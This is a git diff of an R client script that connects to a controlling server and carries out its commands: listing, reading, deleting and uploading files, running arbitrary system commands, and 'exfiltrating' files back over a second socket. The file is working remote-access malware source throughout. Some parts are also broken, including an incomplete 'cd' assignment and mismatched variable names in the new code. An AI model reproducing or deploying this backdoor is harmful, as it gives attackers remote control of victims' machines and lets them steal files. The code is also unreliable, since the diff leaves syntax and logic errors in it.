@@ -15,6 +15,27 @@
     # License along with this library; if not, write to the Free Software
     # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 
+#Helper function, closes {con} without a warning message if
+#connection is null, which is initially is in this program.
+safeClose<- function(con) {
+  if (!is.null(con)) {close(con)}
+}
+
+
+changeDir <- function(command) {
+  toServer <- tryCatch( {
+    dirname <- substring(rawCommand, 4)
+    if (!dir.exists(dirname)) {
+      signalCondition(simpleError("That folder does not exist"))
+    }
+    setwd(dirname)
+  }, error=function(e) {
+    paste("Error: ", e$message)
+  }, warning=function(w){
+    paste("Warning: ", w$message)
+  })
+  return(toServer)
+}
 
 client <- function(host="localhost", port=4471, secondaryPort=5472) {
   socket <- socketConnection(host=host, port=port, server=FALSE, blocking=TRUE, encoding="utf-8", timeout=300, open="r+")
@@ -28,28 +49,29 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
 #    print(toServer)
     writeLines(as.character(toServer), socket)
     rawCommand <- readLines(socket, 1)
-    command <- strsplit(rawCommand, " ", fixed=TRUE)[[1]]
-    if (!(is.na(command[1]))) {
+    if (identical(rawCommand, character(0))) {
+      command = c()
+    } else {
+      command <- strsplit(rawCommand, " ", fixed=TRUE)[[1]]
+    }
+    if (length(command) > 0 && !(identical(command[1], character(0)))) {
+
       if (command[1] == "exit") {
         exiting <- TRUE
       }
+
       else if (command[1] == "dir" || command[1] == "ls") {
         toServer <- paste(dir(all.files = TRUE), collapse="%&%")
       }
+
       else if (command[1] == "pwd") {
         toServer <- getwd()
       }
+
       else if (command[1] == "cd") {
-        toServer <- tryCatch( {
-          dirname <- substring(rawCommand, 4)
-          if (!dir.exists(dirname)) {
-            signalCondition(simpleError("That folder does not exist"))
-          }
-          setwd(dirname)
-        }, error=function(e) {
-          return(paste("Error: ", e$message))
-        })
+        toServer <-
       }
+
       else if (command[1] == "del" || command[1] == "rm") {
         toServer <- tryCatch( {
           start <- nchar(command[1]) + 2
@@ -58,11 +80,15 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
           paste("Deleted", fileName)
         }, error=function(e) {
           paste("Error: ", e$message)
+        }, warning=function(e){
+          paste("Warning: ", w$message)
         })
       }
+
       else if (command[1] == "cat" || command[1] == "type") {
         start <- nchar(command[1]) + 2
         fileName <- substring(rawCommand, start)
+        targetFile <- NULL
         toServer <- tryCatch( {
           targetFile <- file(fileName, "r", encoding="utf-8")
           paste(readLines(targetFile), collapse="%&%")
@@ -71,35 +97,42 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
         }, warning=function(w) {
           "This is not a text file"
         }, finally=function() {
-          close(targetFile)
+          safeClose(targetFile)
         })
       }
+
       else if (command[1] == "download") {
         fileName <- substring(rawCommand, 10)
         abortDownload <- FALSE
         fileSize <- 0
+        targetFile <- NULL
         fileData <- tryCatch({
           if (!file.exists(fileName)) {
             signalCondition(simpleError("File not found"))
           }
-          fileSize <- as.integer(file.info(fileName, extra_cols=FALSE)$size)
+          fileInfo <- file.info(fileName, extra_cols=FALSE)
+          fileSize <- as.integer(fileInfo$size)
           #Slight overestimate to compensate for floating point rounding error.
           #File size is saved as a float in file.info.
+          if (fileInfo$isdir) {
+            signalCondition(simpleError("That's a directory, this command can only download files."))
+          }
           if (fileSize*1.01 >= 2^31) {
             signalCondition(simpleError("File too large to exfiltrate."))
           }
           targetFile <- file(fileName, "rb")
           readBin(targetFile, what="raw", n=fileSize*1.01)
         }, error=function(e){
-          abortDownload <- TRUE
+          abortDownload <<- TRUE
           writeLines("-1", socket)
           paste("Error reading file: ", e$message)
         }, warning=function(w){
+          abortDownload <<- TRUE
           paste("Warning: ", w$message)
         }, finally=function(){
-          close(targetFile)
+          safeClose(targetFile)
         })
-
+        exfilSocket <- NULL
         if (!abortDownload) {
           writeLines(toString(fileSize), socket)
           toServer <- tryCatch({
@@ -111,17 +144,19 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
           }, warning=function(w){
             paste("Warning: ", w$message)
           }, finally=function(){
-            close(exfilSocket)
+            safeClose(exfilSocket)
           })
         } else { #Error message
           toServer <- fileData
         }
 
       }
+
       else if (command[1] == "upload") {
         abortUpload <- FALSE
         fileSize <- as.integer(readLines(socket, 1))
         fileName <- substring(rawCommand, 8)
+        uploadSocket <- NULL
         fileData <- tryCatch({
           if (fileSize < 0) {
             signalCondition(simpleError("Upload Aborted"))
@@ -129,14 +164,17 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
           uploadSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=FALSE, timeout=300, open="rb")
           readBin(uploadSocket, "raw", n=fileSize)
         }, error=function(e){
-          abortUpload <- TRUE
+          abortUpload <<- TRUE
           paste("Error receiving data: ", e$message)
         }, warning=function(w){
-          #Do nothing
+          abortUpload <<- TRUE
+          paste("Warning: ", w$message)
         }, finally=function(){
-          close(uploadSocket)
+          safeClose(uploadSocket)
         })
         if(!abortUpload) {
+          outFile <- NULL
+          print("Executing If Statement")
           toServer <- tryCatch({
             outFile <- file(fileName, "wb")
             writeBin(as.raw(fileData), outFile, size=1)
@@ -144,12 +182,13 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
           }, error=function(e){
             paste("Error writing received data: ", e$message)
           }, finally=function(){
-            close(outFile)
+            safeClose(outFile)
           })
         } else { #Error occurred
-          toServer <- fileData
+          toServer <- "Upload aborted by server"
         }
       }
+
       else if (command[1] == "sys") {
         toServer <- tryCatch({
           paste(system2(command[2], stdout=TRUE, args=command[-(1:2)]), collapse="%&%")
@@ -158,14 +197,18 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
         }, warning=function(w) {
           paste("Warning: ", w$message)
         })
-      } else {
+      }
+
+      else {
         toServer <- paste("Command ", command[1], " not recognized.", sep="'")
       }
+
     }
   }
   close(socket)
 #  print("Socket closed")
 }
+
 
 
 client()
